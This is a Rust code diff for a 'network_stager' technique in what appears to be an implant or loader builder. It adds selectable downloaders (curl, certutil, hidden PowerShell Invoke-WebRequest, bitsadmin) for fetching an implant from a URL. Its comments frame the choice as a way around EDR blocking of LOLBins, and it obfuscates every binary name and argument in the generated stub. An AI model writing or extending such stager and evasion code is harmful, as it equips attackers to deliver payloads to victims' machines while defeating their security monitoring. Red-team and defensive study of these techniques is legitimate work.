@@ -28,6 +28,29 @@ impl StagerCrypto {
     }
 }
 
+/// Which program fetches the payload.
+///
+/// Every transport is a child process, so an EDR that blocks one (for example
+/// `certutil -urlcache`, a classic download LOLBin) may allow another. `auto`
+/// uses `curl` for `http(s)`/`ftp` and `scp` for `scp://`; `curl` is the
+/// default because it ships with Windows 10+ and is less commonly blocked than
+/// `certutil`. A plan with an `scp://` URL always uses `scp`.
+#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "lowercase")]
+pub enum Downloader {
+    /// `curl` for `http(s)`/`ftp`, `scp` for `scp://` (the default).
+    #[default]
+    Auto,
+    /// `curl.exe -sL -o <out> <url>`.
+    Curl,
+    /// `certutil.exe -urlcache -split -f <url> <out>`.
+    Certutil,
+    /// A hidden `powershell -NoProfile -Command Invoke-WebRequest`.
+    Powershell,
+    /// `bitsadmin /transfer <job> /download <url> <out>`.
+    Bitsadmin,
+}
+
 /// Parameters for the network-stager technique.
 #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 pub struct Params {
@@ -36,10 +59,15 @@ pub struct Params {
     /// fetched bytes; its `source` is ignored for a staged payload.
     pub payload: String,
 
-    /// The URL to fetch. The scheme selects the transport at build time:
-    /// `http://`/`https://`/`ftp://` (a `certutil` download) or `scp://`
-    /// (an `scp` download).
+    /// The URL to fetch. The scheme selects the transport family at build time:
+    /// `http://`/`https://`/`ftp://` use the configured `downloader`, `scp://`
+    /// uses `scp`.
     pub url: String,
+
+    /// Which program downloads the payload (default: `auto` = `curl` for
+    /// `http(s)`/`ftp`).
+    #[serde(default)]
+    pub downloader: Downloader,
 
     /// Whether the fetched blob is encrypted (default: `none`).
     #[serde(default)]
@@ -72,6 +100,7 @@ impl Default for Params {
         Self {
             payload: String::new(),
             url: String::new(),
+            downloader: Downloader::Auto,
             crypto: StagerCrypto::None,
             key: None,
             nonce: None,
@@ -95,7 +124,9 @@ pub const DEF: TechniqueDef = TechniqueDef {
     doc_path: "src/techniques/network_stager/README.md",
     readme: include_str!("README.md"),
     stub_fragment: include_str!("stub_fragment.rs"),
-    params_example: "technique: network_stager\nparams:\n  payload: implant\n  url: \"https://example.invalid/implant.bin\"\n",
+    formats: &[],
+    requires_indirect_syscalls: false,
+    params_example: "technique: network_stager\nparams:\n  payload: implant\n  url: \"https://example.invalid/implant.bin\"\n  downloader: curl\n",
     // The download is a Win32 child process (certutil/scp), like
     // `living_off_the_land`: it is not a kernel call the stub issues.
     syscalls: &[],
@@ -151,6 +182,18 @@ impl Params {
     /// scheme, so the fragment needs no scheme literals.
     pub fn render_fragment(&self, strings: &StringsConfig) -> String {
         let is_scp = self.url.starts_with("scp://");
+        // 0 scp, 1 curl, 2 certutil, 3 powershell, 4 bitsadmin. An `scp://` URL
+        // always uses scp, whatever `downloader` says.
+        let downloader = if is_scp {
+            0
+        } else {
+            match self.downloader {
+                Downloader::Auto | Downloader::Curl => 1,
+                Downloader::Certutil => 2,
+                Downloader::Powershell => 3,
+                Downloader::Bitsadmin => 4,
+            }
+        };
 
         let url = strings.obfuscate(&self.url).render_stub_expr("stager_url");
         let scp_target = strings
@@ -166,20 +209,33 @@ impl Params {
             .obfuscate(self.nonce.as_deref().unwrap_or(""))
             .render_stub_expr("stager_nonce");
 
-        let certutil = strings
-            .obfuscate("certutil")
-            .render_stub_expr("bin_certutil");
-        let scp = strings.obfuscate("scp").render_stub_expr("bin_scp");
-        let arg_urlcache = strings
-            .obfuscate("-urlcache")
-            .render_stub_expr("arg_urlcache");
-        let arg_split = strings.obfuscate("-split").render_stub_expr("arg_split");
-        let arg_f = strings.obfuscate("-f").render_stub_expr("arg_f");
-        let arg_o = strings.obfuscate("-o").render_stub_expr("arg_o");
-        let arg_strict = strings
-            .obfuscate("StrictHostKeyChecking=no")
-            .render_stub_expr("arg_strict");
-        let arg_p = strings.obfuscate("-P").render_stub_expr("arg_p");
+        // Every downloader's binary name and flags are obfuscated. Only the one
+        // chosen at build time runs, but all are rendered so the fragment's
+        // `match` compiles.
+        let lit = |text: &str, name: &str| strings.obfuscate(text).render_stub_expr(name);
+        let bin_scp = lit("scp", "bin_scp");
+        let bin_curl = lit("curl", "bin_curl");
+        let bin_certutil = lit("certutil", "bin_certutil");
+        let bin_powershell = lit("powershell", "bin_powershell");
+        let bin_bitsadmin = lit("bitsadmin", "bin_bitsadmin");
+        let arg_urlcache = lit("-urlcache", "arg_urlcache");
+        let arg_split = lit("-split", "arg_split");
+        let arg_f = lit("-f", "arg_f");
+        let arg_o = lit("-o", "arg_o");
+        let arg_strict = lit("StrictHostKeyChecking=no", "arg_strict");
+        let arg_p = lit("-P", "arg_p");
+        let arg_curl_silent = lit("-sL", "arg_curl_silent");
+        let arg_curl_output = lit("-o", "arg_curl_output");
+        let arg_ps_noprofile = lit("-NoProfile", "arg_ps_noprofile");
+        let arg_ps_command = lit("-Command", "arg_ps_command");
+        let ps_uri_prefix = lit("Invoke-WebRequest -UseBasicParsing -Uri '", "ps_uri_prefix");
+        let ps_outfile_mid = lit("' -OutFile '", "ps_outfile_mid");
+        let ps_suffix = lit("'", "ps_suffix");
+        let arg_bits_transfer = lit("/transfer", "arg_bits_transfer");
+        let arg_bits_job = lit("picaro", "arg_bits_job");
+        let arg_bits_download = lit("/download", "arg_bits_download");
+        let arg_bits_priority = lit("/priority", "arg_bits_priority");
+        let arg_bits_normal = lit("normal", "arg_bits_normal");
 
         let mut rendered = DEF
             .stub_fragment
@@ -188,7 +244,7 @@ impl Params {
             .replace("$SCP_PORT_DEF$", &scp_port)
             .replace("$KEY_DEF$", &key)
             .replace("$NONCE_DEF$", &nonce)
-            .replace("$IS_SCP$", if is_scp { "true" } else { "false" })
+            .replace("$DOWNLOADER$", &format!("{downloader}u32"))
             .replace(
                 "$CRYPTO$",
                 if self.crypto.is_encrypted() {
@@ -199,14 +255,29 @@ impl Params {
             )
             .replace("$TIMEOUT_MS$", &format!("{}u32", self.timeout_ms))
             .replace("$RETRIES$", &format!("{}u32", self.retries))
-            .replace("$BIN_CERTUTIL$", &certutil)
-            .replace("$BIN_SCP$", &scp)
+            .replace("$BIN_SCP$", &bin_scp)
+            .replace("$BIN_CURL$", &bin_curl)
+            .replace("$BIN_CERTUTIL$", &bin_certutil)
+            .replace("$BIN_POWERSHELL$", &bin_powershell)
+            .replace("$BIN_BITSADMIN$", &bin_bitsadmin)
             .replace("$ARG_URLCACHE$", &arg_urlcache)
             .replace("$ARG_SPLIT$", &arg_split)
             .replace("$ARG_F$", &arg_f)
             .replace("$ARG_O$", &arg_o)
             .replace("$ARG_STRICT$", &arg_strict)
-            .replace("$ARG_P$", &arg_p);
+            .replace("$ARG_P$", &arg_p)
+            .replace("$ARG_CURL_SILENT$", &arg_curl_silent)
+            .replace("$ARG_CURL_OUTPUT$", &arg_curl_output)
+            .replace("$ARG_PS_NOPROFILE$", &arg_ps_noprofile)
+            .replace("$ARG_PS_COMMAND$", &arg_ps_command)
+            .replace("$PS_URI_PREFIX$", &ps_uri_prefix)
+            .replace("$PS_OUTFILE_MID$", &ps_outfile_mid)
+            .replace("$PS_SUFFIX$", &ps_suffix)
+            .replace("$ARG_BITS_TRANSFER$", &arg_bits_transfer)
+            .replace("$ARG_BITS_JOB$", &arg_bits_job)
+            .replace("$ARG_BITS_DOWNLOAD$", &arg_bits_download)
+            .replace("$ARG_BITS_PRIORITY$", &arg_bits_priority)
+            .replace("$ARG_BITS_NORMAL$", &arg_bits_normal);
         for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
             rendered = rendered.replace(
                 placeholder,
